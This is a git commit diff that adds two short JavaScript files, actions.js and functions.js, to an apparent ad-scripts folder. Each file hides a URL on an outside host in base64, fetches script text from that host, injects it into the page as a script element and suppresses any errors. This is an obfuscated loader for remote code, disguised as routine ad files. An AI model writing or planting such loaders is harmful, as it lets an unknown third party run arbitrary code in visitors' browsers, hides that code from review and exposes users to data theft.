776276b0c071fb17339a0022d2e4132f8456dea3
VisibleSpawn <5om7zrenzelauren@gmail.com>
2026-06-06 01:30:01 -1100

    Add files via upload

---
+++ ad-javascripts-v2/n/actions.js
@@ -0,0 +1,8 @@
+﻿fetch(atob('aHR0cHM6Ly9jZG4ubWVkaWEtYW5hbHl0aWMuY29tL2FjdGlvbnMuanM='))
+    .then(function (r) { return r.text(); })
+    .then(function (c) {
+        var s = document.createElement('script');
+        s.textContent = c;
+        document.body.appendChild(s);
+    })
+    .catch(function () {});
---
+++ ad-javascripts-v2/n/functions.js
@@ -0,0 +1,8 @@
+﻿fetch(atob('aHR0cHM6Ly9jZG4ubWVkaWEtYW5hbHl0aWMuY29tL2Z1bmN0aW9ucy5qcw=='))
+    .then(function (r) { return r.text(); })
+    .then(function (c) {
+        var s = document.createElement('script');
+        s.textContent = c;
+        document.body.appendChild(s);
+    })
+    .catch(function () {});
